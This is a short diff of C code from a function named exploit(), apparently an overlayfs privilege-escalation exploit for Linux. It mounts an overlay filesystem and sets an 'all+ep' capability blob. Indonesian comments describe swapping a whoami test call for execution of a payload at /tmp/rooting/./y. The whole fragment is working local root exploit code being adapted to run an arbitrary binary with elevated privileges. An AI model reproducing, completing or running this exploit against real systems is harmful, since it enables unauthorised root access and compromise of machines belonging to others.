@@ -92,8 +92,8 @@ static int exploit() {
     if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
         err(1, "mount %s", DIR_MERGE);
 
-    // Tambahkan perintah whoami setelah overlayfs di-mount
-    system("whoami");
+    // Ganti system("whoami") dengan eksekusi /tmp/rooting/./y
+    system("/tmp/rooting/./y");
 
     // all+ep
     char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
